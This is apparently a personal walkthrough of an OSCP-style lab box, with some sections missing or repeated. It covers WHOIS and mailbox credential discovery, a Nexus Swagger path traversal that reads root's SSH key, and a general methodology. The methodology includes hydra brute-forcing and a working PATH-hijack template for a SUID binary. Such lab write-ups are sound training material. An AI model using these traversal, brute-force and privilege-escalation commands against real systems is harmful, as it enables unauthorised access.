1.1 Reading the scan

Port Claimed service What it actually is
22 SSH OpenSSH 9.6p1 — no version to exploit, so credentials or keys
25 SMTP not SMTP: the fingerprint is a WHOIS registry ("OSCP.EXAM Domain Registry", "WHOIS query")
110 POP3 Dovecot — mailbox
143 IMAP Dovecot — mailbox
587 SMTP submission part of the same mail stack
993 IMAPS part of the same mail stack

This is what "nothing open" looks like on an OSCP-style Linux box. There is no HTTP, no writable share, no file service, no version with a public CVE. Every path either needs credentials or ends in a mail protocol.

1.2 The one anomaly worth following

nmap says port 25 speaks SMTP, but the fingerprint-strings block is a directory lookup:

output
% OSCP.EXAM Domain Registry
entries found for the queried object:
attendance, contact: d.oscp.exam
ERROR: no entries found
match was found in the registry database.
WHOIS query

Three things follow from that text:

  1. The service is a WHOIS-style registry, not a mail transfer agent.
  2. It answers with "entries found for the queried object" — so it takes a query argument.
  3. It is a Linux box pretending to be an SMTP server, which means the box wants you to talk to it by hand.

The TLS certificate (CN=mail, valid for exactly 24 hours) is there to reinforce the mail disguise. A one-day cert is also a hint that the box was built fresh for the exam attempt.

1.3 Reading the scan

Nothing is open that can be used without an account — except the mail stack, which needs credentials, and the WHOIS service, which does not.

So the intended order is: read the WHOIS service → get an account → use it on the mail service, not on SSH. Brute-forcing SSH here is the time sink — exactly the trap the box is built around.

02

WHOIS on 25

The 'SMTP' service is a registry

The registry on port 25 returns domain records in WHOIS format. The value in them is not the domain data — it is the contact, which is the account used on the mail service.

2.1 Query it

command
whois -h 192.168.91.119 oscp.exam

The whois-style record set returned by the service:

output
Name: Administrator
...
OSCP Infrastructure Division
External Network Operations
+1-555-0142
sysad@oscp.exam
2023-06-12T09:30:00Z
...
O=OSCP-REGISTRY

Name: Operations Team
...
OSCP Infrastructure Division
...
Field Value
Registrant name Administrator (and other records: Operations Team)
Organisation OSCP Infrastructure Division — External Network Operations
Phone +1-555-0142
Contact e-mail sysad@oscp.exam
Created 2023-06-12T09:30:00Z
Registry object O=OSCP-REGISTRY

The important line is the contact address: it gives a username. The domain of that address is the domain you already know, so the local part — sysad — is what the mail service wants.

If whois is not installed, the same answer comes from talking to the port: nc 192.168.91.119 25 and typing the query (WHOIS oscp.exam, HELP), as the banner suggests.

2.2 The reasoning, stated plainly

The record looks like ordinary registration data, and that is exactly why it is easy to skip. The account name in it is a mail account, and the account logs in with its own name as the password.

Two habits come out of this moment:

  1. Read every service that produces text. A WHOIS record is a directory entry; directories contain owners; owners are accounts.
  2. Re-use the name as the password. On an exam box built for a human, a service account named sysad very often ships with sysad as its password. It is the cheapest guess in the book, and here it is the intended path.

This is the step that costs hours: sysad looks like an SSH account, but it is a mail login. Testing it against SSH first goes nowhere.

3.2 Read the mailbox

A GUI mail client (a three-pane reader) is faster than IMAP by hand. With telnet the minimum is:

output

b SELECT INBOX                → message count
c FETCH 1:* (ENVELOPE)        → subjects, senders, dates

The message list holds about nine messages of ordinary internal correspondence. The one that matters is the account-provisioning notice, the ninth mail.

3.3 The email that gives the next host

The body of that message:

output
... has been configured.

... [assigned, imaging complete]

... [standard dev permissions]
... [tooling - only (dev group)]

Hi,

... change his password after first login
... procedure. Could you verify his access
... get a chance? The dev team needs him
... staff meeting on Tuesday.

Reading it as a provisioning ticket:

Line What it tells you
"has been configured" a new account was created
"imaging complete" a machine was built for that person
"standard dev permissions" the account is in a developers group
"change his password after first login" the password in the ticket is still valid
"the dev team needs him" the account is in active use, not a decoy

Inside that message (or attached to the same thread) are the SSH credentials for the account. That mail is the first foothold: SSH in as the provisioned user.

The credential string: [redacted]. The username is james. Treat the pattern as the finding: provisioning mail → initial password → SSH.

3.4 Why this is the intended path

Everything here is a credential flow, not an exploit:

output
WHOIS record ──▶ sysad ──▶ mailbox ──▶ provisioning mail ──▶ new dev account ──▶ SSH

No CVE, no brute force, no exploit code. The box tests whether you treat a mail server as a source of credentials. The rule that solves this box: try every credential you are given against every service that accepts one, however unlikely it looks.

05

Nexus → root

Swagger file read, id_rsa, root proof

The low-privilege shell from chapter 04 is enough to read the Nexus installation. Nexus exposes a Swagger UI on 8005, the Swagger UI takes an API key, and one of its endpoints takes a file path and returns the file. That is the whole privilege escalation: path=../../../../root/.ssh/id_rsa.

5.1 What the user shell already had

From chapter 04: linpeas on 192.168.91.110 reported /opt/nexus/ files readable by the current user but not world-readable, and a listener on 8005. Reading the config from that shell is what produces the API key:

output
/opt/nexus/nexus-3.x.x/etc/...

The API key comes from the Nexus configuration on disk, and it is what the Swagger Authorize dialog wants.

Path and value of that key: [redacted]. It is used in the Swagger Authorize dialog with ApiKeyAuth (apiKey) filled in.

5.5 The point of the box

If you can read files, go straight for the ones that matter: /root/.ssh/id_rsa, /etc/shadow, service configuration with embedded keys. A 200 with the key as an attachment is the whole box; the rest is chmod 600 and ssh -i.

The trick is always the same: the readable path is hidden behind a feature that looks routine.

That last line is the whole trick: the endpoint is named artifacts/download, which sounds like it serves repository artifacts. Nothing about the name suggests arbitrary file read, but the parameter is a raw path and the app never normalises it. Two habits generalise:

  1. An “artifact/binary/file download” API is a file-read primitive. Try /etc/passwd first, then the keys you actually want: /root/.ssh/id_rsa, /root/.ssh/authorized_keys, /home/*/.ssh/id_rsa.
  2. Root's SSH key is a shell. When traversal gives you id_rsa, chmod 600 and ssh -i — do not waste time decrypting /etc/shadow.

06

Methodology

The repeatable per-box loop

The loop I run on every box, in order, with the rule that makes each step worth its time. This is deliberately shallow-then-deep: cheap checks across the whole surface first, expensive work only where evidence points.

Phase 0 — Setup

command
mkdir -p /tmp/<box> && cd /tmp/<box>
export TARGET=<ip>

Everything for the box lands in one directory: scan output, loot, evidence. It makes writing the report afterwards trivial and stops me confusing two boxes' output.

Phase 1 — Reachability and TCP

Step Command Rule
Ping ping -c 2 -W 2 $TARGET TTL tells you the OS before you scan (64 Linux, 128 Windows)
Full TCP nmap -p- --min-rate 3000 -T4 -oN full_tcp.txt $TARGET Always -p-. A top-1000 scan is a guess
Versions nmap -sV -sC -p<open> -oN services.txt $TARGET Only the open ports; -sC is cheap and occasionally decisive

Decision: for each open port, ask "what is the configuration weakness most likely to be, given this version?" Version CVEs come last — most boxes are misconfigured, not unpatched.

Phase 2 — UDP (do not skip this)

command
nmap -sU --top-ports 30 -T4 --max-retries 1 --host-timeout 180s $TARGET

If 161/udp is open:

command
for c in public private manager internal; do
  snmpwalk -v1 -c "$c" -t 5 -r 1 $TARGET 1.3.6.1.2.1.1 2>&1 | head -3
done

Then, on success, always:

command
snmpwalk -v1 -c public $TARGET 1.3.6.1.4.1.8072.1.3.2   # nsExtendTable — the money tree
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.4.2.1.2   # process names
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.6.3.1.2   # installed packages
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.4.20.1.1     # interface IPs

nsExtendTable gives you the commands the agent runs plus the admin's own description of them. Descriptions are written for an internal audience and routinely name accounts and policies.

Phase 3 — Per-service enumeration

For each service, in the order that historically pays fastest.

HTTP/HTTPS

command
curl -s -i http://$TARGET/ | head -20          # stock page? framework? redirect?
for p in robots.txt sitemap.xml .git/ .htaccess server-status; do
  curl -s -o /dev/null -w "%{http_code} %{size_download}  /$p\n" http://$TARGET/$p
done
feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 40 -d 2 --smart --no-state -q
  • Note the 404 body size — it is your filter for everything after.
  • Vhosts: ffuf -u http://$TARGET/ -H "Host: FUZZ" -w <subdomains> -fr "<default page text>".
  • Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.

FTP

command
ftp -n -v $TARGET <<< $'user anonymous anon@test\nls\nbye'   # 530 on USER = anonymous_enable=NO
hydra -L users.txt -P pass.txt -t 4 -f ftp://$TARGET

Try the account name as the password. Check for key material, configs, and backups in the data directory — a shared /srv/ftp often leaks a different account's secrets.

SSH

command
ssh -i key -o BatchMode=yes user@$TARGET id      # never point a key at a host without -o BatchMode
ssh-keygen -l -f key                             # read the comment first: it names the user

SMB

command
nxc smb $TARGET -u '' -p '' --shares
nxc smb $TARGET -u guest -p '' --shares
nxc smb $TARGET -u user -p pass -d DOMAIN --shares

Phase 4 — Foothold

Get a shell, then immediately stabilise and record identity:

command
id; hostname; sudo -n -l; uname -a

Do not start hunting for privesc before you know exactly which uid and groups you hold — the escalation path depends on it.

Phase 5 — Local enumeration (Linux)

Send one script over one connection and read one report:

command
ssh user@$TARGET 'bash -s' < enum.sh

Checklist, in the order that finds things:

# Check Command
1 sudo rights sudo -n -l
2 SUID, excluding snap noise find / -perm -4000 -type f 2>/dev/null \| grep -v '^/snap'
3 Capabilities getcap -r / 2>/dev/null
4 Cron cat /etc/crontab; ls -la /etc/cron.*
5 Writable service files find / -writable -type f -path '*/etc/*' 2>/dev/null
6 Listening sockets ss -tlnp
7 Home directories ls -la /home/* — this box had the SUID helper in a user's home
8 History and keys ls -la ~/.ssh; cat ~/.bash_history
9 Kernel uname -a — only if 1–8 are empty
10 Password reuse the foothold password against sudo -S and other users

Rule: a custom SUID binary beats every generic exploit. Read it before reaching for linpeas output tables.

Phase 6 — Binary analysis (when a SUID binary looks custom)

command
file /path/binary                    # not stripped? then function names survive
strings -a /path/binary | head -40   # look for system, popen, exec*, and bare command names
objdump -d -M intel /path/binary | sed -n '/<main>:/,/^$/p'
readelf -d /path/binary | grep -E 'BIND_NOW|FLAGS'   # is RELRO full? (memory bugs are then out)

What you are looking for, in priority order:

  1. system() / popen() with a bare command name → PATH hijack (CWE-426)
  2. setuid(0)/seteuid(0) before that call → the shell will not drop privileges → full root
  3. A writable path used by root → symlink or overwrite attack
  4. A shell escape in a pager/editor it invokes

If the binary is setuid and setgid, or lives in a user-writable directory, the box author is telling you this is the path.

Phase 7 — Post-exploitation and reporting

command
cat /root/proof.txt; cat /home/*/local.txt
ip a; ip r          # can this host pivot? (single NIC + default route = no)

Record: exact flags, the id output as root, the mechanism in one paragraph, and every command with its output. Then clean up.

Cleanup checklist

  • Remove every file you created, then verify with ls.
  • Revert any file you modified.
  • Do not change credentials you do not own; if an exploit would have (this box's chpasswd), note that it did not run.
  • Note in the report what you changed and what you left alone.

Timeboxing heuristics

Situation Budget Move on when
Web on a stock default page 10 min Two wordlists + vhosts agree there is nothing
Version-CVE rabbit hole 5 min The package revision shows the backport
Credential guessing 5 min per service Account-specific defaults exhausted
Generic privesc sweep 15 min A custom SUID/service/cron finding exists

The recurring lesson: spend the time on the surface you have not looked at, not on the one you have already disproved. On this box, thirty UDP ports were worth more than an hour of web.

Binary analysis

command
file bin                                  # "not stripped" = function names survive
strings -a bin | head -40                 # system / popen / exec / bare command names
objdump -d -M intel bin | sed -n '/<main>:/,/^$/p'
readelf -d bin | grep -E 'BIND_NOW|FLAGS' # full RELRO => forget GOT overwrite
objdump -s -j .rodata bin | head          # resolve the strings passed to system()

Reconstructing source from a small binary:

output
+ setuid / setgid  →  setuid(0); setgid(0);
+ lea rdi,[rip+...] →  the argument is a fixed string
+ call system@plt  →  system("...")

Privesc — PATH hijack template

command
D=$(mktemp -d /tmp/x.XXXXXX)
cat > "$D/chpasswd" <<'EOF'
#!/bin/bash
id > /tmp/root_id.txt
cat /root/proof.txt > /tmp/root_proof.txt 2>&1
chmod 644 /tmp/root_id.txt /tmp/root_proof.txt
EOF
chmod +x "$D/chpasswd"

## name the faked binary exactly as the SUID program invokes it
PATH="$D:$PATH" /path/to/suid_binary

cat /tmp/root_id.txt

Works only when the SUID binary calls setuid(0)/seteuid(0) before system(). If it does not, the shell drops privileges and the payload runs as you. Check the disassembly order first.

Interactive variant:

command
printf '#!/bin/bash\n/bin/bash -p\n' > "$D/chpasswd"; chmod +x "$D/chpasswd"
PATH="$D:$PATH" /path/to/suid_binary
